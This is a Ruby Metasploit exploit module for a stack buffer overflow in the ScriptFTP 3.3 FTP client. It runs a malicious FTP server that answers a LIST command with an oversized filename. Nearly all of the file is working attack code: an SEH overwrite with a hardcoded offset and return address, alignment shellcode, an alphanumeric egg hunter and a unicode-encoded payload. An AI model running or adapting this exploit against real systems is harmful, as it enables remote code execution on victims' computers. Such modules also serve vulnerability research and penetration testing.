class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Exploit::Remote::FtpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ScriptFTP 3.3 Remote Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow on ScriptFTP 3.3 ftp client. The overflow is
				triggered when the client connects to a FTP server which sends an overly long directory
				and filename in response to a LIST command.

				This will cause an access violation, and will eventually overwrite the saved extended
				instruction pointer.
			},
			'Author' 	 =>
				[
					'modpr0be',	#found the bug
					'cyberheb',	#help for msf module
				],
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: 12196 $",
			'References'     =>
				[
					[ 'URL', 'http://www.digital-echidna.org/2011/09/scriptftp-3-3-remote-buffer-overflow-exploit-0day/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x00\x0a\x0f\x0c\x0d",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP Universal', { 'Ret' => "\x45\x5B", 'Offset' => 1746 } ],
								],
			'Privileged'     => false,
			'DisclosureDate' => 'Sept 20 2010',
			'DefaultTarget'  => 0))

	end

	def get_unicode_payload(p)
		badchars = "\x00\x0a\x0f\x0c\x0d"
                encoder = framework.encoders.create("x86/unicode_mixed")
                encoder.datastore.import_options_from_hash( {'BufferRegister'=>'EAX'} )
                unicode_payload = encoder.encode(p, badchars, nil, platform)
                return unicode_payload
        end
	
	def setup
		super
	end

	def on_client_unknown_command(c,cmd,arg)
		c.put("200 OK\r\n")
	end

	def on_client_command_list(c,arg)
		conn = establish_data_connection(c)
		if(not conn)
			c.put("425 Can't build data connection\r\n")
			return
		end
		print_status(" - Data connection set up")
		code = 150
		c.put("#{code} Here comes the directory listing.\r\n")
		code = 226
		c.put("#{code} Directory send ok.\r\n")
		
		totalsize = 5000
		nseh = "\x61\x62"
		seh = target['Ret']
		nop = "\x73"

		align = "\x60"			#pushad
		align << nop			#nop/align
		align << "\x53"			#push ebx
		align << nop			#nop/align
        	align << "\x58"			#pop eax
		align << nop			#nop/align
		align << "\x05\x02\x11"     	#add eax,0x11000200
		align << nop             	#nop/align
        	align << "\x2d\x01\x11"     	#sub eax,0x11000120
		align << nop             	#nop/align
		align << "\x50"			#push eax/nop/ret
		align << nop
		align << "\xc3"
		
		hunter = "PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA"
		hunter << "58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB36CQ7ZKPKPORPR2JM2PXXMNNOLKUQJRT"
		hunter << "ZOVXKPNPM0RT4KKJ6ORUZJFO2U9WKOZGA"
		
		align2 = '0t0t'			#this is the egg
		align2 << nop			#nop/push edi/nop/pop eax/nop
		align2 << "\x57"
		align2 << nop
		align2 << "\x58"
		align2 << nop				
		align2 << "\xb9\x1b\xaa"	#mov ecx,0xaa001b00
		align2 << "\xe8"		#add al,ch + nop
		align2 << nop
		align2 << "\x50\x73\xc3"	#push eax,nop,ret
		
		adjust1 = rand_text_alpha_upper(106)
		adjust1 << nop
		adjust2 = rand_text_alpha_upper(544)

		p = get_unicode_payload(payload.encoded)
		
		filename = rand_text_alpha_upper(target['Offset'])
		filename << nseh << seh
		filename << align
		filename << adjust1
		filename << hunter
		filename << adjust2
		filename << align2
		filename << p
		filename << adjust1
		filename << "D" * (totalsize - filename.length)

		print_status(" - Sending file list via data connection")
		dirlist = "-rwxrwxrwx    1 100      0         11111 Jun 11 21:10 #{filename}.txt\r\n"
		dirlist << "drwxrwxrwx    1 100      0         11111 Jun 11 21:10 #{filename}\r\n"
		dirlist << "-rwxrwxrwx    1 100      0         11111 Jun 11 21:10 #{filename}.txt\r\n"
		conn.put("total 3\r\n"+dirlist)
#		conn.close
		print_status(" - Payload sent, wait for hunter...")
		return
	end

end
